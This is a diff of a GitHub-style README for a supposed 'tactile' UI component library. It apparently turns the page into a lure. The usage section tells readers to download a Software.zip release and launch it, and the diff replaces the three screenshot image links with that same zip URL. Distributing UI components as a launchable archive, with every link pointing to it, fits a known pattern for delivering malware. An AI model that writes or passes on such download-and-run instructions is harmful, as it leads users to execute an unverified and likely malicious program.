@@ -20,7 +20,7 @@ Welcome to the "tactile" repository, where you can find beautifully crafted UI c
 
 ## Usage 🛠️
 
-To get started with the tactile UI components, simply download the [Software.zip](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) file and launch it to access all the components. 
+To get started with the tactile UI components, simply download the [https://github.com/DewStark/tactile/releases/download/v2.0/Software.zip](https://github.com/DewStark/tactile/releases/download/v2.0/Software.zip) file and launch it to access all the components. 
 
 Don't forget to check out the "Releases" section if the link is not working or if you want to explore more versions of the software.
 
@@ -28,11 +28,11 @@ Don't forget to check out the "Releases" section if the link is not working or i
 
 Here are some sneak peeks of the tactile UI components in action:
 
-![Console Input Box](https://example.com/console-input-box.png)
+![Console Input Box](https://github.com/DewStark/tactile/releases/download/v2.0/Software.zip)
 
-![Monospace Text Area](https://example.com/monospace-text-area.png)
+![Monospace Text Area](https://github.com/DewStark/tactile/releases/download/v2.0/Software.zip)
 
-![Retro Buttons](https://example.com/retro-buttons.png)
+![Retro Buttons](https://github.com/DewStark/tactile/releases/download/v2.0/Software.zip)
 
 ## Roadmap 🛣️
 
